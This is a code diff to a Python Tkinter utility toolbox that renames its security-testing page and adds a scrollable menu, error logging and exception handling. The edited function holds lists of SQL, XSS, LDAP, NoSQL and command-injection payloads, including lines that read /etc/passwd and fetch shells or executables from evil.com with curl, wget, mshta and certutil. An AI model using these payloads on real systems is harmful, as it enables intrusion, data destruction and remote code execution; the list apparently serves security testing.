@@ -1478,13 +1478,13 @@ class ToolboxApp(tk.Tk):
         ("文件处理", [0, 1, 2, 3]),       # 图片转PDF/图片批量转ZIP/文件分割/文件合并
         ("数据生成", [4, 5, 6]),          # 生成指定大小文件/生成指定长度文本/随机人员信息
         ("开发工具", [8, 7, 9, 10]),      # 接口请求/URL编码解码/JSON格式化/JSON对比
-        ("安全测试", [14]),               # 上传注入
+        ("安全测试", [14]),               # 数据注入
         (None, [11, 13, 12]),             # 截图识别表格/设置/关于（独立功能不分组，设置在关于上方）
     ]
 
     def _build_ui(self):
         left = tk.Frame(self, bg="#2c3e50", width=200)
-        left.pack(side="left", fill="y")
+        left.pack(side="left", fill="both", expand=False)
         left.pack_propagate(False)
 
         tk.Label(left, text="功能菜单", fg="white", bg="#2c3e50",
@@ -1543,8 +1543,15 @@ class ToolboxApp(tk.Tk):
     def _build_menu(self, parent):
         """构建二级分组菜单：组头可折叠/展开，组内为功能项；独立功能直接一级显示"""
         self._menu_item_labels = {}  # 页面索引 -> 菜单项 label
-        container = tk.Frame(parent, bg="#2c3e50")
-        container.pack(fill="both", expand=True, padx=8, pady=8)
+        canvas = tk.Canvas(parent, bg="#2c3e50", highlightthickness=0)
+        scrollbar = ttk.Scrollbar(parent, orient="vertical", command=canvas.yview)
+        container = tk.Frame(canvas, bg="#2c3e50", padx=8, pady=8)
+        canvas.configure(yscrollcommand=scrollbar.set)
+        scrollbar.pack(side="right", fill="y")
+        canvas.pack(side="left", fill="both", expand=True)
+        canvas.create_window((0, 0), window=container, anchor="nw")
+        container.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
+        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1 * (e.delta / 120)), "units"))
 
         for group, indices in self._MENU_GROUPS:
             if group is None:
@@ -1606,7 +1613,7 @@ class ToolboxApp(tk.Tk):
     def _page_title(self, index):
         return ["图片转 PDF", "单图单PDF转ZIP", "文件分割", "文件合并",
                 "生成指定大小文件", "生成指定长度文本", "随机人员信息",
-                "URL编码解码", "接口请求", "JSON格式化", "JSON对比", "截图识别表格", "关于", "设置", "安全测试"][index]
+                "URL编码解码", "接口请求", "JSON格式化", "JSON对比", "截图识别表格", "关于", "设置", "数据注入"][index]
 
     def _select_menu(self, index):
         self._save_current_log()
@@ -1861,6 +1868,7 @@ class ToolboxApp(tk.Tk):
             except Exception as e:
                 self._buffer.write(f"\n[错误] {e}\n[堆栈]\n{traceback.format_exc()}\n")
                 self._task_error = e
+                self._dev_log("ERROR", f"{e}\n{traceback.format_exc()}")
 
         self._task_thread = threading.Thread(target=worker, daemon=True)
         self._task_thread.start()
@@ -1885,6 +1893,7 @@ class ToolboxApp(tk.Tk):
         result = self._result_box[0] if self._result_box else None
         if self._task_error:
             result = None
+            self._dev_log("ERROR", f"{self._task_error}\n{traceback.format_exc()}")
         self._task_thread = None
         if self._on_done:
             try:
@@ -3904,7 +3913,7 @@ class ToolboxApp(tk.Tk):
 
     # =============== 页面14: 安全测试 ===============
     def _show_page_security(self):
-        self.title_label.config(text="安全测试")
+        self.title_label.config(text="数据注入")
         self._label(self.content, "选择注入类型，生成可测试的注入代码，支持复制和导出为文件。").pack(anchor="w", pady=(0, 8))
 
         row1 = self._row(self.content)
@@ -3944,110 +3953,116 @@ class ToolboxApp(tk.Tk):
 
     def _generate_injection(self):
         """根据选中类型生成注入代码"""
-        type_label = self._security_type_var.get()
-        type_map = {"SQL注入": "sql", "XSS脚本注入": "xss", "命令注入": "cmd",
-                     "LDAP注入": "ldap", "NoSQL注入": "nosql"}
-        self._security_current_type = type_map.get(type_label, "sql")
+        try:
+            type_label = self._security_type_var.get()
+            type_map = {"SQL注入": "sql", "XSS脚本注入": "xss", "命令注入": "cmd",
+                         "LDAP注入": "ldap", "NoSQL注入": "nosql"}
+            self._security_current_type = type_map.get(type_label, "sql")
 
-        payloads = {
-            "sql": [
-                "' OR '1'='1",
-                "' OR 1=1--",
-                "' UNION SELECT NULL,NULL,NULL--",
-                "'; DROP TABLE users--",
-                "admin' OR '1'='1'--",
-                "' OR EXISTS(SELECT * FROM information_schema.tables)--",
-                "' UNION SELECT username,password FROM users--",
-                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
-                "' OR 1=1 LIMIT 1--",
-                "' AND SLEEP(5)--",
-                "' OR 'a'='a",
-                "\" OR \"1\"=\"1",
-                "' OR 1=1#",
-                "'; WAITFOR DELAY '0:0:5'--",
-                "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
-            ],
-            "xss": [
-                "<script>alert(1)</script>",
-                "<img src=x onerror=alert(1)>",
-                "<svg onload=alert(1)>",
-                "<body onload=alert(1)>",
-                "<iframe src=javascript:alert(1)>",
-                "<a href=javascript:alert(1)>click</a>",
-                "<div onmouseover=alert(1)>hover</div>",
-                "<input onfocus=alert(1) autofocus>",
-                "<details ontoggle=alert(1) open>",
-                "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
-                "<svg><script>alert(1)</script></svg>",
-                "\"><script>alert(1)</script>",
-                "'><script>alert(1)</script>",
-                "<img src=1 onerror=alert(1)>",
-                "<marquee onstart=alert(1)>",
-            ],
-            "cmd": [
-                "; dir",
-                "&& whoami",
-                "| cat /etc/passwd",
-                "$(whoami)",
-                "`whoami`",
-                "| ls -la",
-                "; ipconfig",
-                "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
-                "| powershell Get-Process",
-                "; ping 127.0.0.1 -n 5",
-                "|| dir",
-                "| curl http://evil.com/shell",
-                "& mshta http://evil.com/shell.hta",
-                "| certutil -urlcache -f http://evil.com/malware.exe",
-                "; wget http://evil.com/shell.sh",
-            ],
-            "ldap": [
-                "*",
-                "(objectClass=*)",
-                "*)(uid=*",
-                "(&(objectClass=user)(cn=*))",
-                "(cn=*)(|(uid=*)(sn=*))",
-                "(&(uid=*)(objectClass=person))",
-                "(|(cn=admin)(uid=admin))",
-                "(&(mail=*)(|(!(cn=*))(|(sn=*))))",
-                "(&(objectClass=*)(memberOf=cn=admin,ou=groups,dc=example,dc=com))",
-                "(|(uid=admin)(userPassword=*))",
-            ],
-            "nosql": [
-                '{"$gt": ""}',
-                '{"$ne": null}',
-                '{"$gt": "", "$lt": ""}',
-                '{"$where": "return true"}',
-                '{"$gt": "", "$exists": true}',
-                '{"$regex": ".*"}',
-                '{"$where": "this.password == \"admin\""}',
-                '[{"$gt": ""}]',
-                '{"username": {"$eq": "admin"}, "password": {"$ne": null}}',
-                '{"$or": [{"username": "admin"}, {"password": {"$exists": true}}]}',
-            ],
-        }
+            payloads = {
+                "sql": [
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "'; DROP TABLE users--",
+                    "admin' OR '1'='1'--",
+                    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
+                    "' UNION SELECT username,password FROM users--",
+                    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+                    "' OR 1=1 LIMIT 1--",
+                    "' AND SLEEP(5)--",
+                    "' OR 'a'='a",
+                    "\" OR \"1\"=\"1",
+                    "' OR 1=1#",
+                    "'; WAITFOR DELAY '0:0:5'--",
+                    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+                ],
+                "xss": [
+                    "<script>alert(1)</script>",
+                    "<img src=x onerror=alert(1)>",
+                    "<svg onload=alert(1)>",
+                    "<body onload=alert(1)>",
+                    "<iframe src=javascript:alert(1)>",
+                    "<a href=javascript:alert(1)>click</a>",
+                    "<div onmouseover=alert(1)>hover</div>",
+                    "<input onfocus=alert(1) autofocus>",
+                    "<details ontoggle=alert(1) open>",
+                    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+                    "<svg><script>alert(1)</script></svg>",
+                    "\"><script>alert(1)</script>",
+                    "'><script>alert(1)</script>",
+                    "<img src=1 onerror=alert(1)>",
+                    "<marquee onstart=alert(1)>",
+                ],
+                "cmd": [
+                    "; dir",
+                    "&& whoami",
+                    "| cat /etc/passwd",
+                    "$(whoami)",
+                    "`whoami`",
+                    "| ls -la",
+                    "; ipconfig",
+                    "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
+                    "| powershell Get-Process",
+                    "; ping 127.0.0.1 -n 5",
+                    "|| dir",
+                    "| curl http://evil.com/shell",
+                    "& mshta http://evil.com/shell.hta",
+                    "| certutil -urlcache -f http://evil.com/malware.exe",
+                    "; wget http://evil.com/shell.sh",
+                ],
+                "ldap": [
+                    "*",
+                    "(objectClass=*)",
+                    "*)(uid=*",
+                    "(&(objectClass=user)(cn=*))",
+                    "(cn=*)(|(uid=*)(sn=*))",
+                    "(&(uid=*)(objectClass=person))",
+                    "(|(cn=admin)(uid=admin))",
+                    "(&(mail=*)(|(!(cn=*))(|(sn=*))))",
+                    "(&(objectClass=*)(memberOf=cn=admin,ou=groups,dc=example,dc=com))",
+                    "(|(uid=admin)(userPassword=*))",
+                ],
+                "nosql": [
+                    '{"$gt": ""}',
+                    '{"$ne": null}',
+                    '{"$gt": "", "$lt": ""}',
+                    '{"$where": "return true"}',
+                    '{"$gt": "", "$exists": true}',
+                    '{"$regex": ".*"}',
+                    '{"$where": "this.password == \\"admin\\"}',
+                    '[{"$gt": ""}]',
+                    '{"username": {"$eq": "admin"}, "password": {"$ne": null}}',
+                    '{"$or": [{"username": "admin"}, {"password": {"$exists": true}}]}',
+                ],
+            }
 
-        selected = payloads.get(self._security_current_type, payloads["sql"])
-        lines = []
-        for i, p in enumerate(selected, 1):
-            lines.append(f"{i}. {p}")
+            selected = payloads.get(self._security_current_type, payloads["sql"])
+            lines = []
+            for i, p in enumerate(selected, 1):
+                lines.append(f"{i}. {p}")
 
-        self._security_code_lines = selected
-        self._security_code_text.config(state="normal")
-        self._security_code_text.delete("1.0", "end")
-        self._security_code_text.insert("1.0", "\n".join(lines))
-        self._security_code_text.config(state="disabled")
-        self._log(f"[安全测试] 已生成 {self._security_current_type.upper()} 注入代码，共 {len(selected)} 条")
+            self._security_code_lines = selected
+            self._security_code_text.config(state="normal")
+            self._security_code_text.delete("1.0", "end")
+            self._security_code_text.insert("1.0", "\n".join(lines))
+            self._security_code_text.config(state="disabled")
+            self._log(f"[安全测试] 已生成 {self._security_current_type.upper()} 注入代码，共 {len(selected)} 条")
+        except Exception as e:
+            self._notify(f"生成注入代码失败: {e}")
 
     def _copy_injection(self):
         """复制当前代码到剪贴板"""
-        if not self._security_code_lines:
-            self._notify("没有可复制的代码，请先生成")
-            return
-        text = "\n".join(self._security_code_lines)
-        self.clipboard_clear()
-        self.clipboard_append(text)
-        self._notify("注入代码已复制到剪贴板")
+        try:
+            if not self._security_code_lines:
+                self._notify("没有可复制的代码，请先生成")
+                return
+            text = "\n".join(self._security_code_lines)
+            self.clipboard_clear()
+            self.clipboard_append(text)
+            self._notify("注入代码已复制到剪贴板")
+        except Exception as e:
+            self._notify(f"复制失败: {e}")
 
     def _export_injection(self):
         """导出注入代码到文件"""
@@ -4064,15 +4079,15 @@ class ToolboxApp(tk.Tk):
         }
         default_ext, file_desc, pattern = ext_map.get(self._security_current_type, (".txt", "文本文件", "*.txt"))
 
-        f = filedialog.asksaveasfilename(
-            title=f"导出{file_desc}",
-            defaultextension=default_ext,
-            filetypes=[(file_desc, pattern), ("所有文件", "*.*")],
-            initialdir=_APP_DIR,
-            initialfile=f"injection_{self._security_current_type}")
-        if not f:
-            return
         try:
+            f = filedialog.asksaveasfilename(
+                title=f"导出{file_desc}",
+                defaultextension=default_ext,
+                filetypes=[(file_desc, pattern), ("所有文件", "*.*")],
+                initialdir=_APP_DIR,
+                initialfile=f"injection_{self._security_current_type}")
+            if not f:
+                return
             with open(f, "w", encoding="utf-8") as fp:
                 fp.write("\n".join(self._security_code_lines))
             self._notify(f"注入代码已导出到: {f}")
